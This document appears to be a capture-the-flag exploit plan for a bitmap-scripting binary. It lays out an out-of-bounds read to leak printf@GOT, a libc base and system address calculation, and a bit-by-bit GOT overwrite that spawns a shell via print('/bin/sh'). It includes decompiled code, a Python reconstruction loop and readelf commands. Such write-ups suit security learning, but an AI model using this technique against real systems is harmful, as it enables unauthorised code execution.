# libc Address Leak via OOB Read - Full Exploit Plan

## The Problem

We need `system` address, but:
- `system` is not in the binary
- `system` is in libc
- We need to leak a libc address first

## Solution: OOB Read from GOT

**Strategy:**
1. Use `bitmap_get` for OOB read
2. Read from `printf@GOT` (0x409048) - contains libc's printf address
3. Reconstruct the QWORD (64 bits)
4. Calculate libc base and system address
5. Write system to GOT
6. Trigger shell

## bitmap_get Analysis

**Function signature:**
```c
_BOOL8 bitmap_get(__int64 *a1, __int64 a2, __int64 a3)
```

**Code:**
```c
return ((*(char *)(a1[2] + (a3 * *a1 + a2) / 8) >> ((a3 * *a1 + a2) % 8)) & 1) != 0;
```

**What it does:**
- Calculates: `bitmap_data_ptr + (y * width + x) / 8`
- Reads 1 byte from that address
- Extracts 1 bit at position `(y * width + x) % 8`
- Returns 0 or 1

**Same calculation as `bitmap_set`!** So we can read from arbitrary addresses.

## Reading Full QWORD

**To read 8 bytes (QWORD) from printf@GOT:**

1. **Calculate y value:**
   ```
   y = (0x409048 - bitmap_data_ptr) * 8 / INT64_MAX
   ```

2. **Read 64 bits:**
   ```bitscript
   # Read bits 0-63
   # Each get() call reads 1 bit
   # Reconstruct the QWORD
   ```

3. **Reconstruct:**
   ```python
   leaked_value = 0
   for bit in range(64):
       if get(b1, bit, y_leak) == 1:
           leaked_value |= (1 << bit)
   ```

## Calculating libc Addresses

**After reading printf@GOT:**
```
leaked_printf = value at 0x409048 (libc's printf address)
```

**Get libc offsets:**
```bash
# Find printf offset in libc
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep printf

# Find system offset in libc
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
```

**Calculate:**
```
libc_base = leaked_printf - printf_offset
system_addr = libc_base + system_offset
```

## Writing system to GOT

**Once we have system_addr:**

1. **Calculate y value** (same as read)
2. **Write 64 bits:**
   ```bitscript
   # For each bit (0-63):
   if (system_addr & (1 << bit)):
       set(b1, bit, y_write, 1)
   else:
       set(b1, bit, y_write, 0)
   ```

3. **Result:** `printf@GOT` now points to `system`

## Challenges

1. **Heap address:** Need `bitmap_data_ptr` to calculate y
   - Use GDB to find at runtime
   - Or use relative offsets if predictable

2. **64 bit reads/writes:** Need 64 calls each
   - Tedious but doable
   - Could optimize with loops (if bitscript supports)

3. **libc offsets:** Need to know libc version
   - Can detect from leaked address
   - Or use common offsets

## Complete Exploit Flow

```
1. Create bitmap: create(9223372036854775807, 2)
2. Find heap address (GDB or leak)
3. Calculate y_leak = (0x409048 - heap) * 8 / INT64_MAX
4. Read 64 bits from printf@GOT → leaked_printf
5. Calculate: libc_base = leaked_printf - printf_offset
6. Calculate: system_addr = libc_base + system_offset
7. Calculate y_write (same as y_leak)
8. Write 64 bits of system_addr to printf@GOT
9. print("/bin/sh") → system("/bin/sh") → SHELL!
```

## Next Steps

1. **Get heap address** - Use GDB or find info leak
2. **Test OOB read** - Confirm we can read from GOT
3. **Reconstruct QWORD** - Read 64 bits and combine
4. **Get libc offsets** - From libc.so.6
5. **Write system** - 64 set() calls
6. **Trigger shell** - print("/bin/sh")

The OOB read gives us everything we need for full RCE!

